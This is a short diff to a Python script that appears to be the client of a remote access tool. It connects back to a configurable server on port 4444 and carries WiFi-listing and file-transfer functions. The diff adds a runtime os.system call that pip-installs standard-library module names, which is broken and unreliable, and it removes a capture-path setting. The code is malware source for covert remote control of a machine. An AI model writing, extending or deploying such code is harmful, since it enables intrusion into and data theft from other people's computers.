@@ -1,6 +1,8 @@
 #!/usr/bin/python
+import os
+os.system("pip install struct socket subprocess platform webbrowser")
 
-import struct,socket,subprocess,os,platform,webbrowser as browser
+import struct,socket,subprocess,platform,webbrowser as browser
 # server_config
 IP = "localhost" # Your server IP, default: localhost
 port = 4444  # #Your server Port, default: 4444
@@ -63,8 +65,6 @@ def wifishow():
 def download(cmd):
      filetodown = "".join(cmd.split(":upload")).strip()
      filetodown = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[-1] if "\\" in filetodown else filetodown
-     path = os.getcwd()+'/Captures/'
-     doct = os.path.join(path, filetodown)
      wf = open(filetodown, "wb")
      while True:
       data = controler.recv()
